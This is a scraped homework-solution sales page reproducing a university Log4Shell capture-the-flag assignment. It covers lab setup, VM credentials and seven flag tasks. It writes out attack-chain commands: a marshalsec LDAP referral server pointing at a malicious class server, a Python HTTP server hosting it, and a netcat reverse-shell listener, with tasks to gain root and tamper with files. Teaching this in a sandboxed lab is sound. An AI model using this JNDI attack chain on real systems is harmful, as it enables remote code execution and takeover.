# cs6035-log4shell-2025-spring-solved



**<span style='color:red'>TO GET THIS SOLUTION VISIT:</span>** https://www.ankitcodinghub.com/product/cs6035-log4shell-2025-spring-solved/

<h2>Description</h2>



<div class="kk-star-ratings kksr-auto kksr-align-center kksr-valign-top" data-payload="{&quot;align&quot;:&quot;center&quot;,&quot;id&quot;:&quot;127704&quot;,&quot;slug&quot;:&quot;default&quot;,&quot;valign&quot;:&quot;top&quot;,&quot;ignore&quot;:&quot;&quot;,&quot;reference&quot;:&quot;auto&quot;,&quot;class&quot;:&quot;&quot;,&quot;count&quot;:&quot;2&quot;,&quot;legendonly&quot;:&quot;&quot;,&quot;readonly&quot;:&quot;&quot;,&quot;score&quot;:&quot;5&quot;,&quot;starsonly&quot;:&quot;&quot;,&quot;best&quot;:&quot;5&quot;,&quot;gap&quot;:&quot;4&quot;,&quot;greet&quot;:&quot;Rate this product&quot;,&quot;legend&quot;:&quot;5\/5 - (2 votes)&quot;,&quot;size&quot;:&quot;24&quot;,&quot;title&quot;:&quot;CS6035 Log4Shell 2025 Spring Solved&quot;,&quot;width&quot;:&quot;138&quot;,&quot;_legend&quot;:&quot;{score}\/{best} - ({count} {votes})&quot;,&quot;font_factor&quot;:&quot;1.25&quot;}">
            
<div class="kksr-stars">
    
<div class="kksr-stars-inactive">
            <div class="kksr-star" data-star="1" style="padding-right: 4px">
            

<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="2" style="padding-right: 4px">
            

<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="3" style="padding-right: 4px">
            

<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="4" style="padding-right: 4px">
            

<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="5" style="padding-right: 4px">
            

<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
    </div>
    
<div class="kksr-stars-active" style="width: 138px;">
            <div class="kksr-star" style="padding-right: 4px">
            

<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">
            

<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">
            

<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">
            

<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">
            

<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
    </div>
</div>
                

<div class="kksr-legend" style="font-size: 19.2px;">
            5/5 - (2 votes)    </div>
    </div>
<strong>Welcome!</strong>

For this assignment you will exploit a real world vulnerability: Log4Shell.

This will be a capture-the-flag style project where you will exploit a web application with a vulnerable version of log4j.

A correct solution will output a ‘flag’ or ‘key’. There are 7 tasks to complete for 7 total flags. 6 required and 1 extra credit for a possible total of 102%. You will submit these flags in json format to Gradescope for grading in a file named <em>project_log4shell.json</em>.

There is a template in the /home/log4j/Desktop/log4shell folder of the VM: <em>project_log4shell.json</em>. Copy this file and fill out the appropriate values for the flags found. Submit this file to Gradescope for immediate feedback with the autograder. Your grade will be reflected here in Canvas after the assignment has closed.

You’ll use the same virtual machine you’ve been using. <a href="https://cs6035.s3.amazonaws.com/CS6035-Fall-2023-RC1.ova"><strong>&nbsp;(htt</strong></a><a href="https://cs6035.s3.amazonaws.com/CS6035-Fall-2023-RC1.ova"><strong>p</strong></a><a href="https://cs6035.s3.amazonaws.com/CS6035-Fall-2023-RC1.ova"><strong>s://cs6035.s3.amazonaws.com/CS6035</strong></a><a href="https://cs6035.s3.amazonaws.com/CS6035-Fall-2023-RC1.ova"><strong>Fall-2023-RC1.ova)</strong></a>

If you need to <a href="https://cs6035.s3.us-east-1.amazonaws.com/CS6035-Spring-2025-RC-03.ova"><strong>redownload the VM</strong></a> <a href="https://cs6035.s3.us-east-1.amazonaws.com/CS6035-Spring-2025-RC-03.ova"><strong>&nbsp;(htt</strong></a><a href="https://cs6035.s3.us-east-1.amazonaws.com/CS6035-Spring-2025-RC-03.ova"><strong>p</strong></a><a href="https://cs6035.s3.us-east-1.amazonaws.com/CS6035-Spring-2025-RC-03.ova"><strong>s://cs6035.s3.us-east-1.amazonaws.com/CS6035-S</strong></a><a href="https://cs6035.s3.us-east-1.amazonaws.com/CS6035-Spring-2025-RC-03.ova"><strong>p</strong></a><a href="https://cs6035.s3.us-east-1.amazonaws.com/CS6035-Spring-2025-RC-03.ova"><strong>rin</strong></a><a href="https://cs6035.s3.us-east-1.amazonaws.com/CS6035-Spring-2025-RC-03.ova"><strong>g</strong></a><a href="https://cs6035.s3.us-east-1.amazonaws.com/CS6035-Spring-2025-RC-03.ova"><strong>2025-RC-03.ova) </strong></a>, do it early in case you run into slow downloads.

The VM username and password is <strong>log4j</strong> and<strong> ElCapitan_2024</strong>

Go here for project details on the course Github Pages site:

<a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>https://</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>g</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>ithub.</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>g</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>atech.edu/pa</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>g</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>es/cs6035-tools/cs6035-tools.</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>g</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>ithub.io/Pro</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>j</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>ects/Lo</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>g</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>4Shell/ </strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>(htt</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>p</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>s://</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>g</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>ithub.</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>g</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>atech.edu/</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>p</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>a</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>g</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>es/cs6035-tools/cs6035-tools.</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>g</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>ithub.io/Pro</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>j</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>ects/Lo</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>g</strong></a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/"><strong>4Shell/)</strong></a>

Good luck and have fun!

<a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/"><strong>CS 6035</strong></a>

<a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/">Pro</a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/">j</a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/">ects</a> / <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/">Lo</a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/">g</a><a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/">4Shell</a> / Setup

<h1>Setup</h1>
To get setup for the flags, follow the steps carefully below, and be sure you are running each in a separate terminal window as noted.

You will need switch users to login to log4j user via:

Credentials can be found in Canvas on the Log4Shell Assignment page

In the home directory of log4j user, start the container with the start script:

./StartContainer.sh

Open a new terminal window and go to “Desktop/log4shell/logs”: &nbsp;&nbsp;cd Desktop/log4shell/logs

Run the following command to view the logs: &nbsp;&nbsp;tail -f cs6035.log

OR to view System.out.println messages: &nbsp;&nbsp;tail -f console.log

You should now see the tail of the log file from the application running.

<strong>**<em>If the logs stop populating, then just stop and restart the tail. This is happening because the data logged gets too large so the log “rolls over” to another file.</em></strong><em>**</em>

<ol>
<li><strong> Run the LDAP Server:</strong></li>
</ol>
Open a new terminal window and run the following command to set the current directory to “Desktop/log4shell/target”: &nbsp;&nbsp;cd ~/Desktop/log4shell/target

Next, start the LDAP server by running: &nbsp;&nbsp;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “http://172.17.0.1:4242/#Exploi

The IP you will be using is below. This is NOT the localhost IP address but the docker host.

172.17.0.1

<strong>It is very important that this matches the port specified in the Malicious server. If your exploit is not working because it is not connecting to the malicious server, your ports likely do not match OR the vm’s IP is not correct.</strong>

You should see the following output:

<ol start="2">
<li><strong>Run the Malicious Server:</strong></li>
</ol>
Open a new terminal and make sure the active directory is the directory that contains your malicious .class file. For simplicity, we have created “Desktop/log4shell/{flag_no}” for you to work in. <strong>Do not leave this directory</strong>. Run the server in “Desktop/log4shell/{flag_no}” by the following command: &nbsp;&nbsp;python3 -m http.server 4242

<strong>It is very important that this matches the port specified in the LDAP server. If your exploit is not working because it is not connecting to the malicious server, your ports likely do not match OR the vm’s IP is not correct</strong> You should see the following output:

<ol start="3">
<li><strong>Read data that is flowing on the network (This step is required for Flag 2 but isoptional for the rest):</strong></li>
</ol>
Open a terminal and run: &nbsp;&nbsp;nc -nlvp &lt;your_desired_port&gt;

You should see the following output:

<strong>To print debug statements from your Java code, tail the</strong>

<strong>~/Desktop/log4shell/logs/console.log file and add System.out.println statements to your Exploit.java.</strong>

<h1>Intro Flag</h1>
Now that we are set up, let’s do a quick rundown of Log4j, how it works at a high level, and test that we are able to successfully call and exploit the application.

As you should know from the background and resource’s section, Log4j is an application logging library that outputs user defined program information. An example log statement would look like the following:

static Logger log = LogManager.getLogger(RestServlet.class.getName()); log.debug(“ApplicationId: {}”, applicationId);

The log statement above as you can see, defines the class, log level of the message and the actual message. Notice that we are injecting user input into the log message. This is where our vulnerability is.

To be more specific, here is what the output of the message actually will look like:

Now we can map the code above to the logged message. The date/time is defined in configuration files which are out of the scope of this project. Next is where our code starts to map. We have [Classname.java:LineNumber]. This is helpful to know exactly what part of your code is executing and where.

Next, we see DEBUG. This is what is called the log level. Log levels are used for the amount of output you want your application to log, or even to classify errors different from informative messages. The typical log levels are DEBUG, INFO, WARN, ERROR, FATAL. To further explain, if a log level is set to say ERROR, your application will not log anything on WARN, INFO, or DEBUG level. This application is set to DEBUG.

Finally, we get to the actual logged message. As you can see, we log the constant text as well as the injected variable applicationId, which is our applicationId. This is the most important part you will want to pay attention to. Throughout this project, you will try to find messages that log user defined input and inject your malicious string into it.

Now, let’s have some fun and get familiar with the application. To do so, we will call the application normally and then lookup the java version on the application server.

To start we can run a simple inquiry to the services /isAlive endpoint and see what we get back from the logs and see if we can find anything that is exploitable.

<strong><em>GATECH_ID IS A REQUIRED HEADER </em></strong>Open a new terminal and run: curl ‘http://localhost:8080/rest/cartoons/isAlive’ -H ‘GATECH_ID:123456789’ -H ‘Accept:application/json’

You should see your logs log some messages in the log tailing terminal window. Let’s inspect it.

Go back to the terminal window you are tailing the logs in. When the server intercepts a request, it logs “Request intercepted” to alert the user where the request starts. As we can see, there is not much going on in terms of useful information, but we can see the service did log a message that could be exploitable.

Voila! In the highlighted message, we see that it is logging the Method Type: GET, the URL:

/rest/cartoons/isAlive, and some headers that are being logged. This is a good indicator that we can exploit this service by sending lookups through a header.

**Note: You can zoom in by using ctrl + scroll

Take some time to inspect the logged messages and try to understand what the program is doing and the flow of it.

Lets try to get the java version on the server now.

The checked headers for this application are content-type, location, and X-NetworkUserId, although not all are always checked/exploitable.

Construct a malicious payload using one of the logged headers that will return the java version of the host of the web application. You should see something like the screenshot below if successful:

**Note: You might need to scroll up to see this output.

Do you see the same output? LIGHTWEIGHT BABY! Muahaha! If not, try to research the log4shell exploit more and learn how to exploit the lookup.

Our hunch was correct and we have successfully exploited the vulnerability. You can play around with this if you like and see what other lookups you can perform. It is possible to lookup system settings, environment variables and much more just with this.

<strong><em>Be sure to save your work outside of the VM in case the VM crashes or some other unforeseen issue arises. This will ensure you are not losing your work.</em></strong>

<span style="font-size: 2.61792em; letter-spacing: -1px;">Flag 1: Environment Echo (5 pts)</span>

Make sure you have gone through the <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/setup.html">Setup</a> and <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/introflag.html">Intro</a> sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

./StartContainer.sh

The endpoint for this exploit can be called and inspected via:

curl ‘http://localhost:8080/rest/cartoons/isAlive’ -H ‘GATECH_ID:123456789’ -H ‘Accept:application/json’

Add this flag (Congratulations! Your flag1 is: <strong>__</strong><em>__</em>) to your project_log4shell.json file.

NOTE: You do not need to use Java code, ldap, python server, etc to get this flag.

Hint: Accept is not the only valid HTTP Header. Location, location, location

https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/flag1.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/2 2/23/25, 12:01 PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flag 1: Environment Echo | CS 6035

https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/flag1.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/2

Flag 2: Get a Shell (5 pts)

Make sure you have gone through the <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/setup.html">Setup</a> and <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/introflag.html">Intro</a> sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

./StartContainer.sh

The endpoint for this exploit can be called and inspected via: curl ‘http://localhost:8080/rest/cartoons/isAlive’ -H ‘GATECH_ID:123456789’ -H ‘Accept:application/json’

Now that we have proven this service is vulnerable and that we can exploit it in at least one place, let’s try to do more damage and do something more malicious. If you have not already, you NEED to read through the suggested readings and learn how/why it is possible to send jndi lookups.

Open the “Exploit.java” file and construct a malicious payload to execute such that when the jndi/ldap lookup happens, it gives you root access on the vulnerable application server.

You should have a total of 4 terminal windows open which are the 3 from the SETUP section and one terminal window to run your curl command.

Once you are ready to run the exploit, ensure that the java version you are running the command is “java version 1.8.0_20” by running:

java -version

To compile your .java file into a class file, move to the directory the .java file is stored in and run:

javac Exploit.java

<strong><em>NOTE: THIS PROJECT IS WRITTEN USING THE VULNERABLE VERSION OF 1.8.0_20. NOT ALL</em></strong>

<strong><em>VERSIONS OF JAVA ALLOW LOOKUPS AND YOU COULD SPIN YOUR WHEELS FOR AWHILE NOT KNOWING WHY YOUR EXPLOIT IS NOT RUNNING IF YOU DO NOT FOLLOW THIS DIRECTION.</em></strong>

We have added the ability to log from your Exploit.java file so that you can log useful debugging information while you are developing your exploit. <strong>To log messages from your Java class, tail the ~/Desktop/log4shell/logs/console.log file and add System.out.println statements to your Exploit.java.</strong>

This should create Exploit.class. <strong>Run your “python3 -m http.server 4242” command in this directory.</strong>

<strong>Hint: Pay close attention to the ports you are using in this exercise.</strong>

If successful, you should see similar console output as the screenshot below:

With success, you should see this in the console output of the nc command. Now type “whoami” and you should see “root”.

Did you get the screenshot above? Congratulations!

If not, keep trying and ensure all of your hosts/ports match. Analyze the screenshots and make sure yours matches. If you are not getting the ldap/python server output, you likely did not set up your hosts/ports correctly OR your Exploit.java file isn’t correct.

You now have root access to the vulnerable application’s server. YIKES! This is a great example why this exploit is so dangerous. You can perform any task on this server now. For now, go back 2 directories using “cd ..” and then run “java -jar Flag2.jar” to get your flag and add it to the json under “Flag2”.

<h1>FLAG 3: Config.Properties Surprise (25 pts)</h1>
Make sure you have gone through the <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/setup.html">Setup</a> and <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/introflag.html">Intro</a> sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

./StartContainer.sh

For this flag we will use the /cartoons/ resource. There are 4 total endpoints for this resource. Only the following 2 are relevant for this flag.

Call the following endpoint to fetch all the records. Save one of the ids.

GET All – Fetch all cartoon records: curl ‘http://localhost:8080/rest/cartoons/cartoonList’ -H ‘GATECH_ID:123456789’

Call the following endpoint to GET by ID and inspect the logged output.

GET By ID – Fetch a single cartoon record by ID: curl ‘http://localhost:8080/rest/cartoons/cartoon/&lt;id&gt;’ -H ‘GATECH_ID:123456789’

You have caught wind that there is a properties file that this application uses to inject configurable data during runtime.

For this exploit, you will use the log4j exploit to update the “config.properties” file saved in the root directory of the application. This properties file contains a property that will set the rating for all of the children’s cartoons.

See if you can find anything that gives you a hint about how to exploit it/what you need to do, to update the property. Look for an out of place attack vector/variable.

This application links the properties’ rating to all children’s cartoons in its response. You have a beef with childrens cartoons and don’t think kids should watch cartoons. You want to set all of the ratings

https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/flag3.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/2 2/23/25, 12:02 PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flag 3: Config.Properties Surprise | CS 6035

to R. Mean, catoons are great! However, first, you need to make sure that this is even possible.

One thing to keep in mind is that the application checks to see if this file has been tampered with. You will need to make sure you don’t overwrite the file and instead just update it. This means, all properties need to be as they were except the one you updated.

For this flag, you will need to update the properties file so that when the application builds the cartoon response, it sets the rating to your <strong>gatechId</strong>. *i.e. 123456789

If successful, you should get your flag in the network field of the response:

Note: The error message is simply informational and does not mean necessarily that your exploit was successfully executed or not.

<strong>Hint: Someone might have tried to roll their own patch and tried to deny requests containing malicious string patterns.</strong>

<strong>Hint: R rated cartoons are not exploitable.</strong>

<strong>**</strong>* <strong>IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user.</strong> <strong>**</strong>***

https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/flag3.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/2

FLAG 4: Command and Concat (25 pts)

Make sure you have gone through the <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/setup.html">Setup</a> and <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/introflag.html">Intro</a> sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

./StartContainer.sh

For this flag, we will exploit an endpoint that adds a new user: curl -X PUT ‘http://localhost:8080/rest/users/user’ -H ‘GATECH_ID:123456789’ -H ‘Content-Type:application/

Take some time to inspect this output and see what you need to exploit. Yes the exception is expected, and maybe there is even a clue above it 😉

For this flag, you will construct a malicious file (Exploit.java) and compile it, so that when deserialized it will create a simple “.txt” file on the server to get the flag. Using the log4shell exploit, create a file named “Ronnie.txt” on the server and add ONE line that says “AintNothinButAPeanut!” (You do not need the quote). If you do not follow this exactly, you will not get this flag.

Upon success, you will see the output below. (You might have to scroll for this)

https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/flag4.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/2 2/23/25, 12:02 PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flag 4: Command and Concat | CS 6035

<strong>Hint: The name of this flag is a huge hint as to what you need to do. Pay close attention to the logged messages and their format.</strong>

<strong>*** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user.</strong> <strong>**</strong>***

https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/flag4.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/2

&nbsp;

<h1>FLAG 5: PubSub Override (25 pts)</h1>
Make sure you have gone through the <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/setup.html">Setup</a> and <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/introflag.html">Intro</a> sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

./StartContainer.sh

For this flag, we will exploit a previous endpoint that publishes updates to a topic on the server: curl -X PUT ‘http://localhost:8080/rest/users/user’ -H ‘GATECH_ID:903449128’ -H ‘Content-Type:application/

You remember that properties file? Good! We are going to play with it yet again.

For this exploit, you will use the log4j exploit to overwrite the “config.properties” file saved in the root directory of the application. This properties file contains a topic that the application will publish a message to when updateUser call is made (the application is also subscribed to this topic as you can see in the logs).

You will need to trick the application into publishing a message to a different topic with your GATECH_ID as the account number in order to generate a valid flag.

Upon success, you should see your output similar to that below: https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/flag5.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/2 2/23/25, 12:02 PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flag 5: PubSub Override | CS 6035

<strong>Hint: Look through the cs6035.log to find clues about what this other topic could be.</strong> <strong><em>Your flag could be invalid if you have not sent your GATECH_ID appropriately in the published message.</em></strong>

<strong>*** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user.</strong> <strong>**</strong>***

https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/flag5.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/2

<h1>FLAG 6: Restful Data (15 pts)</h1>
Make sure you have gone through the <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/setup.html">Setup</a> and <a href="https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/introflag.html">Intro</a> sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

./StartContainer.sh

For this flag we will use the /products/ resource. There are four endpoints for this resource:

GET All – Fetch all product records

curl ‘http://localhost:8080/rest/products/productlist’ -H ‘GATECH_ID:123456789’

GET By ID – Fetch a single product record by ID

curl ‘http://localhost:8080/rest/products/product/&lt;id&gt;’ -H ‘GATECH_ID:123456789’

GET By Email – Fetch all records associated with an email (This will require you to create a new product with an email field. The initial set of products do not have an email persisted, they return with the default email)

curl ‘http://localhost:8080/rest/products/product?email=example@example.com’ -H ‘GATECH_ID:123456789’

POST Create or Update a new record – Post a new record or update an existing record by providing the id in the request

curl -X POST ‘http://localhost:8080/rest/products/product’ \

-H ‘GATECH_ID:123456789’ \

-H ‘Content-Type: application/json’ \

-d ‘{

“make”: “Ford”,

“model”: “Mustang”, https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/flag6.html 1/2 2/23/25, 12:03 PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flag 6: Restful | CS 6035

“trim”: “GT”,

“price”: 45000.00, “email”: “example@example.com”

}’

We’ve explored introducing malicious strings to be triggered by the application as it accepts and processes an HTTP request. For this flag we’re going to explore an often overlooked attack vector for exploits like Log4J: Data at Rest.

Data at Rest is data that has already been persisted to some data store and is sitting idle. In the case of log4shell, this could be data that is structured in such a way that when the application retrieves and attempts to use or log it, it triggers the LDAP call.

Use the product POST endpoint to persist a record to the database that, when retrieved later, will trigger the LDAP call. You will have to inspect the logs of each of the endpoints to come up with a successful attack strategy.

You will use the log4j exploit to update the “config.properties” file saved in the root directory of the application similar to what you did in Flag 3 and Flag 5. You will write a new property product.id that should have the value set to the id of the malicious product record that you have created/updated.

When the application fetches the record upon calling the right GET endpoint, it will trigger the exploit and, if successful, will generate the Flag 6 message in the logs.

